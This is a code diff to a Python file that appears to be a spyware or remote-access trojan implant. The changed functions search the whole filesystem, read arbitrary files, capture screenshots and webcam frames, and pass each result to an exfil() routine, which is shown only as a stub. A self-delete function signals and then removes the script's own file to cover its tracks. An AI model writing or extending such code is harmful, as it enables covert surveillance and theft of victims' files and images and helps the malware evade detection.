@@ -80,23 +80,29 @@ def ls(cp):
     exfil(process.stdout)
 
 def find(cp):
-    fs = subprocess.Popen(["find", "/"], stdout=subprocess.PIPE)
-    out = subprocess.check_output(["grep", cp], stdin=fs.stdout)
-    exfil(out)
+    process = subprocess.run(["find", "/"], capture_output=True)
+    fs = process.stdout.decode().split("\n")
+    out = ""
+    for file in fs:
+        if cp in file:
+            out += file + "\n"
+    exfil(out.encode())
 
 def get(cp):
-    file = open(cp, "r")
+    file = open(cp, "rb")
     contents = file.read()
     exfil(contents)
 
 def sc():
-    exfil(pyautogui.screenshot())
+    exfil(pyautogui.screenshot().tobytes())
 
 def cam():
-    img = cv2.VideoCapture(0)
-    exfil(img.read()[1])
+    vid = cv2.VideoCapture(0)
+    exfil(cv2.imencode('.jpg', vid.read()[1])[1].tobytes())
+    vid.release()
 
 def sd():
+    exfil(bytes([1]))
     subprocess.run(["rm", __file__])
 
 def exfil(info: bytes): # TODO
